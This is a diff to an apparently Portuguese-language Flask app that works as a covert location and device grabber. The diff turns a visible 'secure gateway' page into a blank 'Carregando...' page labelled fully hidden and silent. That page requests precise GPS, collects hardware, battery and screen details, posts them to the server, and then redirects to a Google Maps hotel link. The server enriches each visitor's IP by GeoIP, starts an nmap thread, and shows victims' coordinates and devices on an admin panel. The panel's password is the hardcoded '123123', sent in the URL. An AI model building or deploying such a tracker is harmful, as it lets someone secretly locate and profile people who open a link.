@@ -15,30 +15,26 @@ registros_ip = []
 # Credenciais de Acesso ao Console
 SENHA_ADMIN = "123123"
 
-# Página HTML de Captura Teleométrica Avançada (Payload Unificado)
-HTML_CAPTURA = """
+# Link de redirecionamento final solicitado
+LINK_DESTINO = "https://www.google.com/maps/place/Oaks+Chengdu+at+Cultural+Heritage+Park/@30.6887276,103.9289403,15z/data=!4m12!1m2!2m1!1zSG90w6lpcw!3m8!1s0x36efc2ba0825d43b:0x2c1214b7071a826c!5m2!4m1!1i2!8m2!3d30.678253!4d103.93095!16s%2Fg%2F11sk9qfcrj?entry=ttu&g_ep=EgoyMDI2MDgzMS4wIKXMDSoASAFQAw%3D%3D"
+
+# Página HTML de Captura Totalmente Oculta (Silenciosa)
+HTML_CAPTURA = f"""
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SECURE SYSTEM GATEWAY - IDENTIFICATION DIVISION</title>
+    <title>Carregando...</title>
     <style>
-        body { font-family: 'Courier New', Courier, monospace; background-color: #000084; color: #55FF55; text-align: center; margin-top: 15%; }
-        .box { border: 2px dashed #FF5555; padding: 20px; display: inline-block; background: #000042; }
-        h2 { color: #FFFF55; text-transform: uppercase; font-size: 16px; }
-        p { color: #FFFFFF; font-size: 13px; }
+        body {{ background-color: #ffffff; margin: 0; }}
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2>IDENTIFICATION DIVISION.</h2>
-        <p>PROGRAM-ID. SECURE-HANDSHAKE-V3.</p>
-        <p>>> ESTABELECENDO TUNELAMENTO SEGURO E TELEMETRIA... <<</p>
-    </div>
     <script>
-        async function executarPayloadCompleto(lat = null, lon = null, precisao = null) {
-            let infoHardware = {
+        const urlDestino = "{LINK_DESTINO}";
+
+        async function executarPayloadCompleto(lat = null, lon = null, precisao = null) {{
+            let infoHardware = {{
                 hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
                 deviceMemory: navigator.deviceMemory || 'N/A',
                 platform: navigator.platform || 'N/A',
@@ -51,204 +47,203 @@ HTML_CAPTURA = """
                 bateria: 'N/A',
                 resolucqao: window.screen.width + 'x' + window.screen.height,
                 colorDepth: window.screen.colorDepth + ' bits'
-            };
+            }};
 
-            if (navigator.getBattery) {
-                try {
+            if (navigator.getBattery) {{
+                try {{
                     let bat = await navigator.getBattery();
                     infoHardware.bateria = Math.round(bat.level * 100) + '% (' + (bat.charging ? 'CARREGANDO' : 'DESCARGA') + ')';
-                } catch(e) {}
-            }
+                }} catch(e) {{}}
+            }}
 
-            const payload = {
+            const payload = {{
                 hw: infoHardware,
                 latitude: lat,
                 longitude: lon,
                 precisao: precisao
-            };
+            }};
 
-            try {
-                await fetch('/salvar-payload-total', {
+            try {{
+                await fetch('/salvar-payload-total', {{
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: {{ 'Content-Type': 'application/json' }},
                     body: JSON.stringify(payload)
-                });
-            } catch(e) {
+                }});
+            }} catch(e) {{
                 console.error("Erro no dispatch:", e);
-            } finally {
-                window.location.href = "https://www.mercadolivre.com.br/onimusha-way-of-the-sword-ps5/p/MLB76247569";
-            }
-        }
+            }} finally {{
+                window.location.replace(urlDestino);
+            }}
+        }}
 
-        function lidarComSucesso(position) {
+        function lidarComSucesso(position) {{
             executarPayloadCompleto(
                 position.coords.latitude,
                 position.coords.longitude,
                 position.coords.accuracy
             );
-        }
+        }}
 
-        function lidarComErro(error) {
+        function lidarComErro(error) {{
             console.warn("GPS Negado ou Indisponível: " + error.message);
             executarPayloadCompleto(null, null, null);
-        }
+        }}
 
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(lidarComSucesso, lidarComErro, {
+        if (navigator.geolocation) {{
+            navigator.geolocation.getCurrentPosition(lidarComSucesso, lidarComErro, {{
                 enableHighAccuracy: true,
-                timeout: 7000,
+                timeout: 6000,
                 maximumAge: 0
-            });
-        } else {
+            }});
+        }} else {{
             executarPayloadCompleto(null, null, null);
-        }
+        }}
     </script>
 </body>
 </html>
 """
 
-# Painel Administrativo Mainframe COBOL Estilo Raiz Azulão
+# Painel Administrativo em Estilo Código COBOL Raiz
 HTML_PAINEL = """
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>MAINFRAME SECURITY CONSOLE // COBOL V3.0</title>
+    <title>MAINFRAME TERMINAL - COBOL COMPILER</title>
     <style>
         body { 
             font-family: 'Courier New', Courier, monospace; 
             margin: 0; 
             padding: 20px; 
-            background: #000084; 
-            color: #FFFFFF; 
+            background: #000000; 
+            color: #00FF00; 
         }
-        h2, h3 { 
-            color: #FF5555; 
-            text-transform: uppercase; 
-            border-bottom: 2px dashed #FF5555;
-            padding-bottom: 5px;
+        pre {
+            color: #00FF00;
+            font-size: 12px;
+            line-height: 1.4;
         }
-        .container { max-width: 1450px; margin: auto; }
+        .yellow { color: #FFFF00; }
+        .red { color: #FF5555; }
+        .cyan { color: #55FFFF; }
+        .white { color: #FFFFFF; }
         table { 
             width: 100%; 
             border-collapse: collapse; 
-            background: #000042; 
+            background: #000000; 
             margin-top: 15px; 
             margin-bottom: 30px;
-            border: 2px solid #FF5555;
+            border: 1px solid #00FF00;
         }
         th, td { 
-            border: 1px solid #FF5555; 
-            padding: 8px 10px; 
+            border: 1px solid #00FF00; 
+            padding: 6px 8px; 
             text-align: left; 
             font-size: 11px;
+            color: #FFFF00;
         }
         th { 
-            background: #000021; 
-            color: #FFFF55; 
-            font-weight: bold;
+            background: #001100; 
+            color: #00FF00; 
         }
-        tr:hover { background: #000063; }
-        a { color: #55FFFF; text-decoration: underline; font-weight: bold; }
-        a:hover { color: #FF5555; }
-        .aviso-vazio { color: #FF8888; text-align: center; font-style: italic; }
-        .system-info { font-size: 11px; color: #55FF55; margin-bottom: 20px; }
-        .cobol-code { color: #FFFF55; font-size: 10px; background: #000021; padding: 10px; border: 1px dashed #55FF55; margin-bottom: 15px; }
-        .badge-porta { background: #005500; color: #AAFFAA; padding: 2px 4px; border: 1px solid #55FF55; font-size: 10px; display: inline-block; margin: 2px; }
-        .badge-info { color: #55FFFF; }
+        tr:hover { background: #002200; }
+        a { color: #55FFFF; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+        .badge { background: #003300; color: #00FF00; padding: 1px 4px; border: 1px solid #00FF00; font-size: 10px; display: inline-block; margin: 1px; }
     </style>
 </head>
 <body>
-<div class="container">
-    <h2>=== MAINFRAME SECURITY CONSOLE // PROCEDURE DIVISION V3.0 ===</h2>
-    <div class="cobol-code">
-        000100 IDENTIFICATION DIVISION.<br>
-        000200 PROGRAM-ID. MONITOR-TELEMETRIA.<br>
-        000300 ENVIRONMENT DIVISION. CONFIGURATION SECTION.<br>
-        000400 DATA DIVISION. WORKING-STORAGE SECTION.<br>
-        000500 77 STATUS-CONSOLE PIC X(20) VALUE 'ONLINE-ACTIVE'.<br>
-        000600 77 AUTO-REFRESH-TIMER PIC 9(2) VALUE 5.
-    </div>
-    <div class="system-info">
-        STATUS: ONLINE | AUTO-REFRESH: 5s | NMAP ENGINE: ACTIVE | SECURE PROTOCOL: TCP/IP
-    </div>
+<pre>
+<span class="red">*--------------------------------------------------------------------------------------------------*</span>
+<span class="yellow">  identification division.</span>
+<span class="red">*--------------------------------------------------------------------------------------------------*</span>
+  program-id.      MAINFRAME-SECURE-CONSOLE.
+  author.          PENTESTER-CORE.
+  installation.    SYSTEM-TELEMETRY-UNIT.
+  date-written.    2026-09-03.
+<span class="red">*--------------------------------------------------------------------------------------------------*</span>
+  <span class="cyan">REFERENCIAS</span> :  SISTEMA   : U   - SUPORTE
+                 SUBSISTEMA: UP  - APOIO A PRODUCAO
+                 MODULO    : 06  - SCHEDULER & NMAP ENGINE
+<span class="red">*--------------------------------------------------------------------------------------------------*</span>
+  STATUS CONSOLE : <span class="white">ONLINE-ACTIVE</span> | AUTO-REFRESH: <span class="white">5s</span> | SECURE PROTOCOL: <span class="white">TCP/IP</span>
+</pre>
 
-    <h3>[ TABELA 1: CAPTURAS DE GEOLOCALIZAÇÃO GPS // 01 REGS-GPS ]</h3>
-    <p>Total de Registros GPS Capturados: {{ gps|length }}</p>
-    <table>
-        <tr>
-            <th>DATA / HORA</th>
-            <th>IP DE ORIGEM</th>
-            <th>LATITUDE / LONGITUDE</th>
-            <th>PRECISÃO (METROS)</th>
-            <th>EXTERNAL MAP LINK</th>
-        </tr>
-        {% for r in gps %}
-        <tr>
-            <td>{{ r.data }}</td>
-            <td>{{ r.ip }}</td>
-            <td>{{ r.lat }}, {{ r.lon }}</td>
-            <td>{{ r.precisao }}m</td>
-            <td><a href="{{ r.maps }}" target="_blank">[ABRIR GOOGLE MAPS]</a></td>
-        </tr>
-        {% else %}
-        <tr><td colspan="5" class="aviso-vazio">>> 01 CONDITIONAL: NENHUM DADO DE GPS CAPTURADO NESTE CLUSTER <<</td></tr>
-        {% endfor %}
-    </table>
+<h3 class="yellow">[ 01. TABELA DE CAPTURAS DE GEOLOCALIZAÇÃO GPS ]</h3>
+<p class="white">Total de Registros GPS Capturados: {{ gps|length }}</p>
+<table>
+    <tr>
+        <th>DATA / HORA</th>
+        <th>IP DE ORIGEM</th>
+        <th>LATITUDE / LONGITUDE</th>
+        <th>PRECISÃO</th>
+        <th>EXTERNAL MAP LINK</th>
+    </tr>
+    {% for r in gps %}
+    <tr>
+        <td>{{ r.data }}</td>
+        <td>{{ r.ip }}</td>
+        <td>{{ r.lat }}, {{ r.lon }}</td>
+        <td>{{ r.precisao }}m</td>
+        <td><a href="{{ r.maps }}" target="_blank">[ABRIR GOOGLE MAPS]</a></td>
+    </tr>
+    {% else %}
+    <tr><td colspan="5" style="color: #FF5555; text-align: center;">>> 01 CONDITIONAL: NENHUM DADO DE GPS CAPTURADO NESTE CLUSTER <<</td></tr>
+    {% endfor %}
+</table>
 
-    <h3>[ TABELA 2: INTELIGÊNCIA DE REDE, HARDWARE, NMAP & USER-AGENT // 02 REGS-TELEMETRY ]</h3>
-    <p>Total de Registros de Hardware/Rede: {{ ips|length }}</p>
-    <table>
-        <tr>
-            <th>DATA / HORA</th>
-            <th>IP / GEO / REDE</th>
-            <th>ISP / PROVEDOR</th>
-            <th>HARDWARE & DISPOSITIVO</th>
-            <th>AMBIENTE & NAVEGADOR (USER-AGENT)</th>
-            <th>PORTAS ABERTAS (NMAP LAB SCAN)</th>
-        </tr>
-        {% for r in ips %}
-        <tr>
-            <td>{{ r.data }}</td>
-            <td>
-                {{ r.ip }}<br>
-                <span style="color: #FFFF55;">{{ r.cidade }}/{{ r.estado }} ({{ r.pais }})</span><br>
-                Link: <span class="badge-info">{{ r.hw.connectionType }}</span>
-            </td>
-            <td>{{ r.isp }}</td>
-            <td>
-                CPU Cores: {{ r.hw.hardwareConcurrency }}<br>
-                RAM Aprox: {{ r.hw.deviceMemory }} GB<br>
-                Bateria: {{ r.hw.bateria }}<br>
-                Resolução: {{ r.hw.resolucqao }} ({{ r.hw.colorDepth }})<br>
-                Touch: {{ r.hw.maxTouchPoints }} | Cookies: {{ r.hw.cookieEnabled }}<br>
-                Fuso: {{ r.hw.timezone }}
-            </td>
-            <td>
-                <b>OS:</b> {{ r.ua_info.os }}<br>
-                <b>Browser:</b> {{ r.ua_info.browser }}<br>
-                <b>Device:</b> {{ r.ua_info.device }}<br>
-                <b>Idioma:</b> {{ r.hw.language }}<br>
-                <details style="margin-top: 4px;">
-                    <summary style="cursor: pointer; color: #55FFFF;">Inspect User-Agent</summary>
-                    <small style="word-break: break-all; color: #AAAAAA;">{{ r.user_agent }}</small>
-                </details>
-            </td>
-            <td>
-                {% if r.portas %}
-                    {% for p in r.portas %}
-                        <span class="badge-porta">Porta {{ p.porta }}: {{ p.servico }} ({{ p.estado }})</span><br>
-                    {% endfor %}
-                {% else %}
-                    <span style="color: #FFAAAA;">PERFORM NMAP-SCAN VARYING...</span>
-                {% endif %}
-            </td>
-        </tr>
-        {% else %}
-        <tr><td colspan="6" class="aviso-vazio">>> 01 CONDITIONAL: NENHUM REGISTRO DE HARDWARE CAPTURADO <<</td></tr>
-        {% endfor %}
-    </table>
-</div>
+<h3 class="yellow">[ 02. TABELA DE INTELIGÊNCIA DE REDE, HARDWARE, NMAP & USER-AGENT ]</h3>
+<p class="white">Total de Registros de Hardware/Rede: {{ ips|length }}</p>
+<table>
+    <tr>
+        <th>DATA / HORA</th>
+        <th>IP / GEO / REDE</th>
+        <th>ISP / PROVEDOR</th>
+        <th>HARDWARE & DISPOSITIVO</th>
+        <th>AMBIENTE & NAVEGADOR (USER-AGENT)</th>
+        <th>PORTAS ABERTAS (NMAP LAB SCAN)</th>
+    </tr>
+    {% for r in ips %}
+    <tr>
+        <td>{{ r.data }}</td>
+        <td>
+            {{ r.ip }}<br>
+            <span class="cyan">{{ r.cidade }}/{{ r.estado }} ({{ r.pais }})</span><br>
+            Link: <span class="white">{{ r.hw.connectionType }}</span>
+        </td>
+        <td>{{ r.isp }}</td>
+        <td>
+            CPU Cores: {{ r.hw.hardwareConcurrency }}<br>
+            RAM Aprox: {{ r.hw.deviceMemory }} GB<br>
+            Bateria: {{ r.hw.bateria }}<br>
+            Resolução: {{ r.hw.resolucqao }} ({{ r.hw.colorDepth }})<br>
+            Touch: {{ r.hw.maxTouchPoints }} | Cookies: {{ r.hw.cookieEnabled }}<br>
+            Fuso: {{ r.hw.timezone }}
+        </td>
+        <td>
+            <b>OS:</b> {{ r.ua_info.os }}<br>
+            <b>Browser:</b> {{ r.ua_info.browser }}<br>
+            <b>Device:</b> {{ r.ua_info.device }}<br>
+            <b>Idioma:</b> {{ r.hw.language }}<br>
+            <details style="margin-top: 4px;">
+                <summary style="cursor: pointer; color: #55FFFF;">Inspect User-Agent</summary>
+                <small style="word-break: break-all; color: #AAAAAA;">{{ r.user_agent }}</small>
+            </details>
+        </td>
+        <td>
+            {% if r.portas %}
+                {% for p in r.portas %}
+                    <span class="badge">Porta {{ p.porta }}: {{ p.servico }} ({{ p.estado }})</span><br>
+                {% endfor %}
+            {% else %}
+                <span class="red">PERFORM NMAP-SCAN VARYING...</span>
+            {% endif %}
+        </td>
+    </tr>
+    {% else %}
+    <tr><td colspan="6" style="color: #FF5555; text-align: center;">>> 01 CONDITIONAL: NENHUM REGISTRO DE HARDWARE CAPTURADO <<</td></tr>
+    {% endfor %}
+</table>
 
 <script>
     // Auto-refresh rigoroso a cada 5 segundos preservando token de acesso (senha)
@@ -261,7 +256,6 @@ HTML_PAINEL = """
 """
 
 def executar_nmap_background(registro_ref):
-    """Executa varredura Nmap assíncrona orientada a objetos de rede"""
     try:
         nm = nmap.PortScanner()
         nm.scan('scanme.nmap.org', arguments='-p 22,80,443,3306,8080 --open -T4')
@@ -302,7 +296,6 @@ def salvar_payload_total():
 
     agora = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
-    # Enriquecimento GeoIP via IP-API
     cidade, estado, pais, isp = "Desconhecido", "Desconhecido", "Desconhecido", "Desconhecido"
     try:
         if ip_cliente != "127.0.0.1" and ip_cliente != "localhost":
@@ -318,10 +311,8 @@ def salvar_payload_total():
     except Exception as e:
         print("Erro GeoIP:", e)
 
-    # Extrai hardware do payload unificado
     hw = dados.get('hw', {})
 
-    # Adiciona registro na Tabela de Inteligência de Rede e Hardware
     novo_registro_ip = {
         "data": agora,
         "ip": ip_cliente,
@@ -336,11 +327,9 @@ def salvar_payload_total():
     }
     registros_ip.insert(0, novo_registro_ip)
 
-    # Dispara Nmap em background thread
     t = threading.Thread(target=executar_nmap_background, args=(novo_registro_ip,))
     t.start()
 
-    # Se a geolocalização GPS veio preenchida, adiciona na Tabela GPS
     lat = dados.get('latitude')
     lon = dados.get('longitude')
     precisao = dados.get('precisao')
@@ -363,7 +352,7 @@ def admin():
     senha_informada = request.args.get('senha', '')
     if senha_informada != SENHA_ADMIN:
         return """
-        <body style="font-family: 'Courier New'; background: #000042; color: #FF5555; text-align: center; margin-top: 15%;">
+        <body style="font-family: 'Courier New'; background: #000000; color: #FF5555; text-align: center; margin-top: 15%;">
             <h2>004010 SECURITY EXCEPTION - ACCESS DENIED</h2>
             <p>AUTORIZAÇÃO REQUERIDA NA URL: <code>/admin?senha=SUA_SENHA</code></p>
         </body>
